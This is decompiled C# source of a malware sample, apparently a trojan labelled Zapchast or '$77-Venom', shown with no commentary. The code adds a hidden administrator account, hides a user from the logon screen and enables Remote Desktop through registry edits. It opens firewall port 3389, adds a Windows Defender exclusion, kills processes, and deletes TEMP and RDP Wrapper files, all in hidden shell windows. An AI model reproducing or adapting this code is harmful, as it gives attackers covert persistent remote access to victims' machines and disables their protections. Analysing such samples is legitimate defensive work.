// Decompiled with JetBrains decompiler
// Type: ⒙闤ḋ룔娹昸ꚙ회趓躉宧疵轣瑵뺰粺〚
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.ServiceProcess;

public class \u2499\uF57C闤ḋ룔娹昸ꚙ회\uF82C趓\uECF1躉宧疵轣瑵뺰粺\u301A
{
  public static bool 빦禑\uFDE5ꋛ硪屏錄\u2A17ꠧ鷣腁\uE6BF\u255C\uF2F3憛\uFFFD꾤⃭逗\u4DD2(string name)
  {
    \u2499\uF57C闤ḋ룔娹昸ꚙ회\uF82C趓\uECF1躉宧疵轣瑵뺰粺\u301A.Ӱ썧\uE3BC땥寬\u2200\u32A4\uE4E7\uF46E\uF13A杁䄋낉㭠\uF6FC\uFFFD㖳\u27F0됖퉏();
    Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true).SetValue("dontdisplaylastusername", (object) 1);
    ProcessStartInfo processStartInfo1 = new ProcessStartInfo("cmd.exe", "/c net user " + name + " " + name + " /add");
    processStartInfo1.CreateNoWindow = true;
    processStartInfo1.RedirectStandardOutput = true;
    processStartInfo1.RedirectStandardError = true;
    processStartInfo1.UseShellExecute = false;
    Process process1 = new Process();
    process1.StartInfo = processStartInfo1;
    process1.Start();
    string end1 = process1.StandardOutput.ReadToEnd();
    process1.WaitForExit();
    if (end1 == null || !end1.ToLower().Contains("command completed successfully."))
      return false;
    ProcessStartInfo processStartInfo2 = new ProcessStartInfo("cmd.exe", "/c net localgroup administrators " + name + " /add");
    processStartInfo2.CreateNoWindow = true;
    processStartInfo2.RedirectStandardOutput = true;
    processStartInfo2.RedirectStandardError = true;
    processStartInfo2.UseShellExecute = false;
    Process process2 = new Process();
    process2.StartInfo = processStartInfo2;
    process2.Start();
    string end2 = process2.StandardOutput.ReadToEnd();
    process2.WaitForExit();
    return end2 != null && end2.ToLower().Contains("command completed successfully.");
  }

  public static void 鶧郓뚌ꡞ伄\uEE11篁ᴡ康놻ꅓ욖Ⱂ簵潡妢餎ꨟ暊\u2F54()
  {
    new ServiceController("TermService").Stop();
    \u2499\uF57C闤ḋ룔娹昸ꚙ회\uF82C趓\uECF1躉宧疵轣瑵뺰粺\u301A.ナ늳䊷䈯ֱりピ\u9FEB૧偬Ꮝ攲㳸컘땠䌌嵥ꩳ뿷舴();
    \u2499\uF57C闤ḋ룔娹昸ꚙ회\uF82C趓\uECF1躉宧疵轣瑵뺰粺\u301A.\u2E3B䇦鸦\uE912䧀智狲䜺\u2F57䲱屓觽섅\uEB43雨釒\uE70BὩ玅烁();
    string str = "C:\\Program Files\\RDP Wrapper\\uninstall.bat";
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell " + str + " & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    string path = "C:\\Program Files\\RDP Wrapper";
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b del /q/f/s " + path + " & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Directory.Delete(path, true);
    \u2499\uF57C闤ḋ룔娹昸ꚙ회\uF82C趓\uECF1躉宧疵轣瑵뺰粺\u301A.ⶆ獣\u281D\uE7C5\uE4F6\uEEEAꌀ䚧碽პ輐漵樰뙣㔏텪\uE409蝿畾틸();
    File.SetAttributes(path, FileAttributes.Normal);
    File.Delete(path);
  }

  public static void ⶆ獣\u281D\uE7C5\uE4F6\uEEEAꌀ䚧碽პ輐漵樰뙣㔏텪\uE409蝿畾틸()
  {
    if (File.Exists("C:\\Program Files\\RDP Wrapper\\rdpwrap.dll"))
    {
      try
      {
        File.Delete("C:\\Program Files\\RDP Wrapper\\rdpwrap.ini");
      }
      catch (IOException ex)
      {
        Console.WriteLine(ex.Message);
        return;
      }
    }
    FileInfo fileInfo = new FileInfo("C:\\Program Files\\RDP Wrapper\\rdpwrap.dll");
    try
    {
      fileInfo.Delete();
    }
    catch (IOException ex)
    {
      Console.WriteLine(ex.Message);
    }
    try
    {
      Directory.Delete("C:\\Program Files\\RDP Wrapper");
    }
    catch (IOException ex)
    {
      Console.WriteLine(ex.Message);
    }
    if (Directory.Exists("C:\\Program Files\\RDP Wrapper"))
    {
      try
      {
        Directory.Delete("C:\\Program Files\\RDP Wrapper", true);
      }
      catch (IOException ex)
      {
        Console.WriteLine(ex.Message);
      }
    }
    DirectoryInfo directoryInfo = new DirectoryInfo("C:\\Program Files\\RDP Wrapper");
    try
    {
      directoryInfo.Delete(true);
    }
    catch (IOException ex)
    {
      Console.WriteLine(ex.Message);
    }
    string path = "C:\\Program Files\\RDP Wrapper";
    FileSecurity accessControl = File.GetAccessControl(path);
    SecurityIdentifier user = WindowsIdentity.GetCurrent().User;
    accessControl.SetOwner((IdentityReference) user);
    accessControl.SetAccessRule(new FileSystemAccessRule((IdentityReference) user, FileSystemRights.FullControl, AccessControlType.Allow));
    File.SetAccessControl(path, accessControl);
    File.Delete(path);
  }

  public static void \u2E3B䇦鸦\uE912䧀智狲䜺\u2F57䲱屓觽섅\uEB43雨釒\uE70BὩ玅烁() => Process.Start(new ProcessStartInfo()
  {
    FileName = "cmd",
    Arguments = "/k start /b del /q/f/s %TEMP%\\* & exit",
    CreateNoWindow = true,
    WindowStyle = ProcessWindowStyle.Hidden,
    UseShellExecute = true,
    ErrorDialog = false
  });

  public static bool ナ늳䊷䈯ֱりピ\u9FEB૧偬Ꮝ攲㳸컘땠䌌嵥ꩳ뿷舴()
  {
    string str1 = "cmd";
    string str2 = "conhost";
    string str3 = "installrdp";
    string str4 = "rdpinstall";
    string str5 = "updaterdp";
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str1))
      {
        process.Kill();
        return true;
      }
    }
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str5))
      {
        process.Kill();
        return true;
      }
    }
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str4))
      {
        process.Kill();
        return true;
      }
    }
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str3))
      {
        process.Kill();
        return true;
      }
    }
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str2))
      {
        process.Kill();
        return true;
      }
    }
    return false;
  }

  public static void Ӱ썧\uE3BC땥寬\u2200\u32A4\uE4E7\uF46E\uF13A杁䄋낉㭠\uF6FC\uFFFD㖳\u27F0됖퉏()
  {
    RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
    if (registryKey1 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey1 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
      registryKey1.SetValue("fDenyTSConnections", (object) 0);
    }
    else
      registryKey1.SetValue("fDenyTSConnections", (object) 0);
    registryKey1.Flush();
    RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
    if (registryKey2 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey2 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
      registryKey2.SetValue("UserAuthentication", (object) 1);
    }
    else
      registryKey2.SetValue("UserAuthentication", (object) 1);
    registryKey2.Flush();
    RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", true);
    if (registryKey3 == null)
    {
      Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", true);
      registryKey3.SetValue("fSingleSessionPerUser", (object) 0);
    }
    else
      registryKey3.SetValue("fSingleSessionPerUser", (object) 0);
    registryKey3.Flush();
    RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
    if (registryKey4 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey4 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
      registryKey4.SetValue("fSingleSessionPerUser", (object) 0);
    }
    else
      registryKey4.SetValue("fSingleSessionPerUser", (object) 0);
    registryKey4.Flush();
    try
    {
      RegistryKey registryKey5 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
      if (registryKey5 != null && registryKey5.GetValue("Durios") != null)
        registryKey5.SetValue("Durios", (object) "0");
      Console.WriteLine("Durios desactivated");
    }
    catch (Exception ex)
    {
      \u2499\uF57C闤ḋ룔娹昸ꚙ회\uF82C趓\uECF1躉宧疵轣瑵뺰粺\u301A.\u227C너赛쵂㱬ᰇ付㸜髄ꏉ\uF618牗坋\u1257㱠쏰鵷ꪱ挝埄("New-ItemProperty -Path HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -Name Durios -PropertyType DWord -Value 0 -Force");
    }
    RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
    if (registryKey6 == null)
    {
      Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey6 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
      registryKey6.SetValue("Durios", (object) 0);
    }
    else
      registryKey6.SetValue("Durios", (object) 0);
    registryKey6.Flush();
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command netsh advfirewall firewall add rule name='allow RemoteDesktop' dir=in protocol=TCP localport=3389 action=allow & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %ProgramFiles%\\RDP Wrapper & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
  }

  private static void \u227C너赛쵂㱬ᰇ付㸜髄ꏉ\uF618牗坋\u1257㱠쏰鵷ꪱ挝埄(string args) => new Process()
  {
    StartInfo = new ProcessStartInfo()
    {
      FileName = "powershell",
      Arguments = args,
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true
    }
  }.Start();
}
